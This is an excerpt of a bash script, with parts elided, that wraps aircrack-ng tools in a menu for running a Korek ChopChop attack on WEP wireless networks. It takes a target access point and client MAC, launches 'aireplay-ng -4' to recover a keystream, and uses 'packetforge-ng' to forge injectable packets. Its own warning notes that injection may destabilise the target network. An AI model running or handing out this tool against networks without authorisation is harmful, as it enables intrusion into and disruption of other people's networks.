...
# Main menu prompt
prompt_to_continue() {
    local options=("Start Korek Chop Chop attack")

    echo
    echo -e "${GREEN}==============================================${NC}"
    echo -e "${BOLD}${GREEN}            Korek Chop Chop Attack        ${NC}${BOLD}${NC}"
    echo -e "${GREEN}==============================================${NC}"
    sleep 0.5
    echo
    echo -e "${RED}[!]${NC} Multiple iterations may be needed. Attack can take time."
    echo -e "${RED}[!]${NC} High injection rates may destabilize the network."
...
korek_attack() {
    ...
    echo -e "${GREEN}[*]${NC} Enter details for the Korek Chop Chop attack:"
    ...
    read -p "$(echo -e "${GREEN}[*]${NC} Press Enter to start the Korek Chop Chop attack...")"

    local LOGFILE
    LOGFILE=$(mktemp /tmp/fraglog.XXXXXX)

    gnome-terminal -- bash -c "sudo aireplay-ng -4 -b '$bssid' -h '$client' '$MONITOR_INTERFACE' 2>&1 | tee '$LOGFILE'; exit" &

    # Wait for output markers
    echo -e "${GREEN}[*]${NC} Waiting for Korek Chop Chop to complete..."
    ...
    sudo packetforge-ng -0 -a "$bssid" -h "$client" -k "$AP_IP" -l "$STATION_IP" -y "$XOR_FILE" -w "Attacks/$forged_name" > /dev/null 2>&1
    sleep 0.3
...
after_attack_options() {
    echo
    echo -e "  ${GREEN}[1]${NC} New Korek Chop Chop attack"
    echo -e "  ${GREEN}[0]${NC} Go back to main menu"
    echo
    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Choose an option:") " o
        case "$o" in
            1) clear; korek_attack; after_attack_options; break ;;  
